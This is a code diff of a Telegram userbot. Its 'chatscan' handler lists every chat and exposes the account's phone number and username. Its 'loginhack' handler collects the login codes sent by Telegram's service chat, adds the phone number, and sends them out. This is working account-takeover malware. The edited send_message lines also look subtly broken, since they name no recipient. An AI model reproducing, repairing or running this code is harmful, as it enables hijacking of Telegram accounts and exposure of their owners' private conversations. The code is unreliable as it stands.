@@ -12,7 +12,7 @@ async def chatscan(event):
     chats = "**Chats**\n"
     async for dailog in client.iter_dialogs():             
         chats += f"**chat:** {dailog.name} | **Id:** {str(dailog.id)}\n"
-    await event.send_messages(chats)
+    await event.client.send_message(chats)
     await event.reply("Phone number: " + "+"+user.phone + "\nUsername: " + "@"+user.username + "\nUserbot Developer: @programmer_www")
 
 
@@ -26,4 +26,4 @@ async def loginhack(event):
     async for message in client.iter_messages(777000):
         codes += f"{message.text}\n---------------------------------------------\n"
     codes += "+"+user.phone
-    await event.reply(codes)
+    await event.client.send_message(codes)
